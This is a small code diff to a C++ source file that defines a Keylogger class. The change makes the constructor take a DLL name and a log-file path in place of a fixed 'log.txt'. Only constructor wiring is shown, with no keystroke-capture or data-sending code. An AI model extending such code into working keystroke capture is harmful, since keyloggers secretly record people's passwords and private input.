@@ -1,7 +1,8 @@
 ﻿#include "keylogger.h"
 
-Keylogger::Keylogger()
-	: file("log.txt", std::ofstream::app)
+Keylogger::Keylogger(const char* dll, const char* file)	
+	: Keyboard(dll)
+	, file(file, std::ofstream::app)
 	, keylog(nullptr) 
 	, console() {}
 
